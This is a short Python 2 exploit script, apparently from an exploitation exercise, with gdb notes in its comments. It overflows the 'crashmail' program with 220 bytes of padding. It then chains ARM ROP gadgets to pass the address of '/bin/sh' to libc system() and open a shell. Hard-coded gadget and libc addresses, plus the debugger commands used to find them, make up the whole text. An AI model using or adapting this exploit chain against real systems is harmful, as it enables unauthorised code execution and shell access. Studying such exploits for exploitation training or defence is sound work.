#0x044017e0 : pop {r4, pc}
#0x04408080 : mov r0, r4; pop {r4, pc}
#find &system,+9999999,"/bin/sh" 0xf7f6fb6c
#$1 = (int (*)(const char *)) 0xf7e7c9c8 <__libc_system>

#gdb -q --args ./crashmail SETTINGS `python crashmailROP.py`
#x/420xw $sp
#x/20xw $sp

from struct import pack


offset = 220

rop_chain = 'A' * offset
rop_chain += pack('I', 0x044017e0) # 0x044017e0 : pop {r4, pc}
rop_chain += pack('I', 0xf7f6eb6c) # "/bin/sh"
rop_chain += pack('I', 0x04408080) # 0x04408080 : mov r0, r4; pop {r4, pc}
rop_chain += 'AAAA' * 1 # Padding
rop_chain += pack('I', 0xf7e7b9c8) # system
rop_chain += 'CCCC' * 1 # Padding

print rop_chain        